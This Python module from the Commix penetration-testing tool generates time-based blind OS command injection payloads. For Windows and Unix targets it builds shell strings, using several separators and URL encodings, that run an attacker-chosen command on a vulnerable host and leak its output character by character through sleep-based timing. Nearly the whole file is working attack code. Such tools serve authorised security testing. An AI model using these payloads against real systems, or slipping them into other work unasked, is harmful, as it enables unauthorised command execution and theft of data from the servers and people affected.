#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import urllib
from src.utils import settings

"""
The "time-based" injection technique on Blind OS Command Injection.
The available "time-based" payloads.
"""

"""
Time-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, output_length, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "||" :
      payload = (separator + 
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                 "do if %i==" +str(output_length) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
                )

    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand +  
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                 "do if %i==" +str(output_length) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
                )

  else:
    if separator == ";" :
      payload = (separator + 
                 "str=$(echo " + TAG + ")" + separator + 
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
                 #"str1=${#str}" + separator + 
                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
                 "then sleep 0" + separator + 
                 "else sleep " + str(timesec) + separator + 
                 "fi "
                 )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + 
                 "str=$(echo " + TAG + ")" + separator + 
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
                 #"str1=${#str}" + separator +  
                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
                 "then sleep 0" + separator + 
                 "else sleep " + str(timesec) + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = urllib.quote("&")
      else:
        ampersand = "&"
      payload = (ampersand + 
                 "sleep 0 " + separator + 
                 "str=$(echo " + TAG + ")" + separator + 
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
                 #"str1=${#str}" + separator + 
                 "[ " + str(output_length) + " -eq $str1 ]" + separator + 
                 "sleep " + str(timesec)
                 )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(output_length) + " != $(echo " + TAG + " " + 
                 pipe + "tr -d '\\n' " + pipe + "wc -c) ] " + separator + 
                 "sleep " + str(timesec)
                 )  
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_DIR + " -c \"print len(\'" + TAG + "\')\""
    if separator == "||" :
      payload = (separator +  " " 
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" +str(output_length) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                )

    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " "
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" +str(output_length) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                )
  else:  
    if separator == ";" :
      payload = (separator + 
                 # Find the length of the output, using readline().
                 "str1=$(python -c \"print len(\'" + TAG + "\')\")" + separator + 
                 "if [ " + str(output_length) + " != ${str1} ]" + separator + 
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + 
                 # Find the length of the output, using readline().
                 "str1=$(python -c \"print len(\'" + TAG + "\')\")" + separator + 
                 "if [ " + str(output_length) + " != ${str1} ]" + separator + 
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = urllib.quote("&")
      else:
        ampersand = "&"
      payload = (ampersand + " "
                 "$(python -c \"import time\ntime.sleep(0)\") " + separator + 
                 # Find the length of the output, using readline().
                 "str1=$(python -c \"print len(\'" + TAG + "\')\")" + separator + 
                 "[ " + str(output_length) + " -eq ${str1} ] " + separator + 
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " != $(python -c \"print len(\'" + TAG + "\')\") ] " + separator + 
                 "$(python -c \"import time\ntime.sleep(0)\") " + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 ) 
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n",";")

  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "||" :
      payload = (separator +  " "
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + 
                "\"') do if %i==" +str(output_length) + " "
                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + " "
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + 
                "\"') do if %i==" +str(output_length) + " "
                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
                )

  else: 
    if separator == ";" :
      payload = (separator + 
                 "str=\"$(echo $(" + cmd + "))\"" + separator + 
                 #"str1=${#str}" + separator + 
                 "str1=$(expr length \"$str\")" + separator +
                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
                 "then sleep 0" + separator + 
                 "else sleep " + str(timesec) + separator + 
                 "fi "
                )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + 
                 "str=\"$(echo $(" + cmd + "))\"" + separator + 
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
                 #"str1=${#str}" + separator + 
                 "if [ " + str(output_length) + " != $str1 ]" + separator + 
                 "then sleep 0" + separator + 
                 "else sleep " + str(timesec) + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = urllib.quote("&")
      else:
        ampersand = "&"
      payload = (ampersand + 
                 "sleep 0" + separator + 
                 "str=$(echo $(" + cmd + "))" + separator +
                 # Find the length of the output.
                 "str1=$(expr length $str)" + separator +
                 #"str1=${#str}  " + separator + 
                 "[ " + str(output_length) + " -eq $str1 ]" + separator + 
                 "sleep " + str(timesec)
                 )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)
        
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " +str(output_length)+ " != $(echo -n \"$(" + cmd + ")\" " + 
                 pipe + "tr -d '\\n'  " + pipe + "wc -c) ] " + separator +  
                 "sleep " + str(timesec)
                 )
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "||" :
      payload = (separator +  " " + 
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd + 
                "') do if %i==" +str(output_length) + " " +
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                )
    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand +  " "
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd + 
                "') do if %i==" +str(output_length) + " " +
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                )
  else: 
    if separator == ";" :
      payload = (separator + 
                 # Find the length of the output, using readline().
                 "str1=$(python -c \"print len(\'$(echo $(" + cmd + "))\')\")" + separator + 
                 "if [ " + str(output_length) + " != ${str1} ]" + separator + 
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + 
                 # Find the length of the output, using readline().
                 "str1=$(python -c \"print len(\'$(echo $(" + cmd + "))\')\")" + separator + 
                 "if [ " + str(output_length) + " != ${str1} ]" + separator + 
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = urllib.quote("&")
      else:
        ampersand = "&"
      payload = (ampersand + 
                 "$(python -c \"import time\ntime.sleep(0)\") " + separator + 
                 # Find the length of the output, using readline().
                 "str1=$(python -c \"print len(\'$(echo $(" + cmd + "))\')\")" + separator + 
                 "[ " + str(output_length) + " -eq ${str1} ] " + separator + 
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " != $(python -c \"print len(\'$(echo $(" + cmd + "))\')\") ] " + separator + 
                 "$(python -c \"import time\ntime.sleep(0)\") " + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 ) 
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n",";")

  return payload
"""
Get the execution output, of shell execution.
"""
def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "||" :
      payload = (separator +  " " +
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" +str(ascii_char)+
                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + 
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" +str(ascii_char)+
                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec + 1) + "\")"
                )

  else: 
    if separator == ";" :
      payload = (separator + 
                # Grab the execution output.
                "cmd=\"$(echo $(" + cmd + "))\"" + separator +       
                # Export char-by-char the execution output.
                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
                # Transform from Ascii to Decimal.
                "str=$(printf %25d \"'$char'\")" + separator +
                # Perform the time-based comparisons
                "if [ " + str(ascii_char) + " != $str ]" + separator +
                "then sleep 0" + separator +
                "else sleep " + str(timesec) + separator +
                "fi "
                )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + 
                # Grab the execution output.
                "cmd=\"$(echo $(" + cmd + "))\"" + separator +     
                # Export char-by-char the execution output.
                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
                # Transform from Ascii to Decimal.
                "str=$(printf %25d \"'$char'\")" + separator +
                # Perform the time-based comparisons
                "if [ " + str(ascii_char) + " != $str ]" + separator +
                "then sleep 0" + separator +
                "else sleep " + str(timesec) + separator +
                "fi "
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = urllib.quote("&")
      else:
        ampersand = "&"
      payload = (ampersand + 
                "sleep 0 " + separator + 
                # Grab the execution output.
                "cmd=\"$(echo $(" + cmd + "))\"" + separator + 
                # Export char-by-char the execution output.
                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
                # Transform from Ascii to Decimal.
                "str=$(printf %25d \"'$char'\")" + separator +
                # Perform the time-based comparisons
                "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
                "sleep " + str(timesec)
                )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " != $(" + cmd + pipe + "tr -d '\\n'" + 
                pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" + 
                pipe + "head -1" + pipe + "awk '{print$2}') ] " + separator + 
                "sleep " + str(timesec)
                )  
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_DIR + " -c \"import os; print ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "])\""
    if separator == "||" :
      payload = (separator +  " " 
                "for /f \"tokens=*\" %i in ('cmd /c " + 
                python_payload +
                "') do if %i==" +str(ascii_char) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                )

    if separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand +  
                "for /f \"tokens=*\" %i in ('cmd /c " + 
                python_payload +
                "') do if %i==" +str(ascii_char) + " "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                )
  else: 
    if separator == ";" :
      payload = (separator + 
                 "str=$(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "])\nexit(0)\")" + separator +
                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + 
                 "str=$(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "])\nexit(0)\")" + separator +
                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + 
                 "$(python -c \"import time\ntime.sleep(0)\") " +  separator + 
                 "str=$(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "])\nexit(0)\")" + separator + 
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + 
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " != $(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "])\nexit(0)\") ] " + separator + 
                 "$(python -c \"import time\ntime.sleep(0)\") " + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
      
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n",";")

  return payload

"""
Get the execution output, of shell execution.
"""
def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "||" :
      payload = (separator +  " " + 
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + 
                "\"') do if %i==" +str(ascii_char)+
                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand +  " "
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + 
                "\"') do if %i==" +str(ascii_char)+
                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
                )

  else:
    if separator == ";" :
      payload = (separator + 
                 "str=\"$(" + cmd + ")\"" + separator + 
                 "if [ " + str(ascii_char) + " != $str ]" + separator + 
                 "then sleep 0" + separator + 
                 "else sleep " + str(timesec) + separator + 
                 "fi "
                 )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + 
                 "str=\"$(" + cmd + ")\"" + separator + 
                 "if [ " + str(ascii_char) + " != $str ]" + separator + 
                 "then sleep 0" + separator + 
                 "else sleep " + str(timesec) + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = urllib.quote("&")
      else:
        ampersand = "&"
      payload = (ampersand + 
                 "sleep 0 " + separator + 
                 "str=\"$(" + cmd + ")\" " + separator + 
                 "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
                 "sleep " + str(timesec)
                 )
      
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " != \"$(" + cmd + ")\" ] " + separator + 
                 "sleep " + str(timesec)
                 )  
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "||" :
      payload = (separator +  " " + 
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd + 
                "') do if %i==" +str(ascii_char) + " " +
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                )

    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand +  " "
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd + 
                "') do if %i==" +str(ascii_char) + " " +
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                )
  else: 
    if separator == ";" :
      payload = (separator + 
                 "str=$(python -c \"print $(echo $(" + cmd + "))\n\")" + separator +
                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "%0a" :
      separator = "\n"
      payload = (separator + 
                 "str=$(python -c \"print $(echo $(" + cmd + "))\n\")" + separator +
                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )
      
    elif separator == "&&" :
      if http_request_method == "POST":
        separator = urllib.quote(separator)
        ampersand = "%26"
      else:
        ampersand = "&"
      payload = (ampersand + 
                 "$(python -c \"import time\ntime.sleep(0)\") " +  separator + 
                 "str=$(python -c \"print $(echo $(" + cmd + "))\n\")" + separator + 
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + 
                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
      if http_request_method == "POST":
        separator = urllib.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " != $(python -c \"print $(echo $(" + cmd + "))\n\") ] " + separator + 
                 "$(python -c \"import time\ntime.sleep(0)\") " + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
      
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n",";")

  return payload
#eof